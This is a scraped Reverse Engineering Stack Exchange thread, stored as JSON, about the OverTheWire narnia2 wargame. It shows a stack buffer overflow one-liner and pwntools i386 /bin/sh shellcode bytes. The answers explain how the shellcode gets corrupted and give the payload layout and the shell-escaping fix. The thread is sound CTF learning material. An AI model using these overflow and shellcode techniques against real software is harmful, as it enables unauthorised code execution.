@@ -1,0 +1,46 @@
+{
+    "title": "pwntools shellcode narnia2",
+    "link": "https://reverseengineering.stackexchange.com/questions/20194/pwntools-shellcode-narnia2",
+    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I'm trying to solve the narnia2 challenge on overthewire. </p>\n<p>I read a guide for help and managed to overwrite the stack with A's using some python</p>\n<p><code>$(python -c \"print 'A'*132 + '\\xef\\xbe\\xad\\xde'\")</code></p>\n<p>and that works fine. I get a seg fault, and can use gdb to see eip has been overwritten with 0xdeadbeef - great so now I assumed the stack size is 132 bytes and then the next 4 overwrite eip to redirect the return. </p>\n<p>( a lot of guides say to use 144 here - but I'm assuming the challenge changed? ) </p>\n<p>I used pwntools to generate me shellcode for a shell ( the same way I solves the previous challenge ) - and got </p>\n<p><code>\n -&gt; asm(shellcraft.i386.linux.sh())\n'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'\n</code></p>\n<p>This payload worked on the previous challenge, but now when I go through the process of sticking this shellcode in my payload it never works. Replacing this with a shellcode from a guide works fine \n<code>\nasm(shellcraft.i386.linux.sh())\n'h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xd2Rj\\x04Z\\x01\\xe2R\\x89\\xe2jhh///sh/binj\\x0bX\\x89\\xe3\\x89\\xd1\\x99\\xcd\\x80'\n</code></p>\n<p>It looks the same but with some extra stuff at the start. Why is this and how is it produced?</p>\n</div>",
+    "votes": "1",
+    "answers": 2,
+    "views": "1k",
+    "tags": [
+        "binary-analysis",
+        "gdb",
+        "pwntools"
+    ],
+    "user": "CWright",
+    "time": "Dec 25, 2018 at 14:12",
+    "comments": [
+        {
+            "user": "p1xel",
+            "text": "<span class=\"comment-copy\">The \"shellcode from a guide\" is different than the pwntools' shellcode (look at the third-last byte).</span>",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>This is a relatively old question, but I recently stumbled across the same problem myself. <a href=\"https://xkcd.com/979/\" rel=\"nofollow noreferrer\">In the interest of the greater good</a>, I will explain what is going on.</p>\n<p>It is likely that the structure of your payload (the entire sequence of bytes you send to the process) is something like this:</p>\n<pre><code>PADDING + SHELLCODE + RETURN_ADDRESS\n</code></pre>\n<p>Sadly, this does not work well with pwntools' shellcode. The reason is that the <code>push</code> instructions modify the stack, <em>where your shellcode is</em>. This means that the shellcode is (unintentionally) mutated to something else, and of course shenanigans ensue.</p>\n<p>The solution is to <a href=\"https://security.stackexchange.com/questions/133629/why-append-an-nop-sled-at-the-end-of-the-shellcode\">add some padding <em>after</em> the shellcode</a>. Because the stack grows to lesser addresses, <code>push</code> instructions will first overwrite the data in the greater address locations.</p>\n<pre><code>PADDING + SHELLCODE + **MORE_PADDING** + RETURN_ADDRESS\n</code></pre>\n<p>For me, <code>MORE_PADDING</code> of 32 bytes worked nicely. Do not forget to reduce the size of the original <code>PADDING</code> appropriately so that the return address is correctly overwritten.</p>\n</div>",
+            "votes": "2",
+            "user": "p1xel",
+            "time": "Aug 20, 2020 at 10:22",
+            "is_accepted": false,
+            "comments": []
+        },
+        {
+            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>When encountering such issue, you should keep debugging. After breaking on the payload you can notice GDB is showing these instructions (as Intel flavor disassembly):</p>\n<pre><code>push   0x68\npush   0x732f2f2f\npush   0x6e69622f\nmov    ebx,esp\npush   0x1010101\nxor    DWORD PTR [ecx+eax*1],0x51c93101\npush   0x4\n</code></pre>\n<p>This XOR instruction is suspicious since it is using <em>eax</em> and <em>ecx</em> while they've not been initiliazed by our shellcode. I checked against what <em>pwnlib</em> instructions suggest for this shellcode:</p>\n<pre><code>shellcraft.i386.linux.sh()\n/* ... */\nxor dword ptr [esp], 0x1016972\n/* ... */\n</code></pre>\n<p>Then, you're still getting a SEGFAULT because the instruction is wrong, and dereferencing some incorrect values.</p>\n<p>Also the second shellcode you're providing can be retrieved with <code>shellcraft.execve('/bin/sh')</code>.</p>\n<hr/>\n<p>EDIT </p>\n<p>The issue is not from <em>pwntools</em> but must be linked to the way the payload is used. The bad instruction identified above contains a '$' character which is then (if you still use your <code>$(python -c '...')</code> input) interpreted by the subshell invoked as the variable name '$ri'.</p>\n<p>This variable is likely not defined in your shell which in turn makes these 3 characters to be deleted from the input given to the program, hence, modifying operands of this instruction and the instruction following it.</p>\n<p>In order to make it right, you may sanitize the input by bringing whatever is required. For example :</p>\n<pre><code>asm(shellcraft.i386.linux.sh()).replace('$','\\$')\n</code></pre>\n<p>I suppose it is the issue you got, but can't be sure without more information.</p>\n</div>",
+            "votes": "0",
+            "user": "Leath",
+            "time": "Dec 26, 2018 at 18:18",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "CWright",
+                    "text": "<span class=\"comment-copy\">So that means the payload created by pwnlib is incorrect and using values it hasn't yet initialised?</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
